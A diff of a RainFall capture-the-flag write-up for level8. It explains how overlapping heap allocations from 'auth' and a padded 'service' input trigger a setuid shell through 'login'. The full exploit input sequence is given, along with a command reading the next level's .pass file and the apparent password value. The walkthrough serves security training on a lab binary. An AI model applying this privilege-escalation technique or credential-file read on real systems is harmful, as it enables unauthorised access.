@@ -1,54 +1,75 @@
-## Description
-By decompiline the ASM we can observe it is an infinite user's prompt.
-It triggers behaviour by sending the following commands
-* "auth "
-* "reset"
-* "service"
-* "login"
+Execute the *level8* binary:
 
-##Commands
-Each commands has specific behavior
-* "auth "
-Allocate 4 bytes of memory and assign a pointer to it at \<auth\> address (0x8049aac)
-It then perform `strcpy` but that doesn't interest us.
-
-* "reset"
-Frees \<auth\>
-
-* "service"
-strdup the input after "service" substring to \<service> address (0x8049ab0)
-
-* "login"
-This is what interest us as it will allow us to access a shell with level9 permissions
+```bash
+./level8
+test
 ```
-if (((uint8_t*)auth)[32] != 0) {
-  system("/bin/sh");
-}
-```
-This tells us that if the byte located at pointer's index 32 is not equal to 0x0, it will execute "/bin/sh"
 
-## Solution
-By executing the binary, we can see the following
-```(nil), (nil)```
-
-Sending commands as input such as "auth " or "service" will display their respective allocated memory pointer on the heap
 ```
-level8@RainFall:~$ ./level8
 (nil), (nil)
-auth
-0x804a008, (nil)
+test
+(nil), (nil)
+chat
+(nil), (nil)
+```
+
+> Note the *level8* binary start an infinite loop and read the user input for each turn.
+
+```gdb
+disass main
+```
+
+> Use __set disassembly-flavor intel__ command to set the intel syntax.
+
+After analysing the main, find 4 user input recognition:
+
+- __"auth "__ : malloc 4 bytes in a *auth* global variable and put in the rest of the user input
+- __"reset"__ : free the *auth* global variable
+- __"service"__ : copy the rest of the user input in a *service* global variable using the *strdup* function
+- __"login"__ : start a shell session if the auth\[32\] is not NULL, else prompt a message that doesn't interest us
+
+So the goal is to put a non NULL value in __auth\[32\]__ byte to reach the shell.
+
+```bash
+./level8
+auth 
 service
+```
+
+```
+(nil), (nil)
+0x804a008, (nil)
 0x804a008, 0x804a018
 ```
-If we type in `service` a second time
+
+> After each user input, the program print the address of the *auth* and *service* global variables.
+
+The malloc calls return always the same addresses because the [ASLR](https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR#:~:text=Address%20space%20layout%20randomization%20(ASLR)%20is%20a%20memory%2Dprotection,executables%20are%20loaded%20into%20memory.) is not active:
+
+```bash
+file ./level8
 ```
-0x804a008, 0x804a028
+
 ```
-Notice the difference between those two addresse equals `0x20`, which is `32`
-This is what we are looking for
-Then type `"auth "`, and we get access to the shell
+./level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
 ```
+
+> *LSB executable* means the program [doesn't implement ASLR](https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code).
+
+Note that the *service* global variable is __16 bytes__ after the *auth* one, so to reach the 32n bytes after the address of the *auth* global variable, we can write __16 bytes__ after the __service command__.
+(16 byte of padding + 16 input bytes)
+
+```basg
+./level8 
+auth 
+service0123456789abcdef
 login
 $ cat /home/user/level9/.pass
+```
+
+```
+(nil), (nil)
+0x804a008, (nil)
+0x804a008, 0x804a018
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
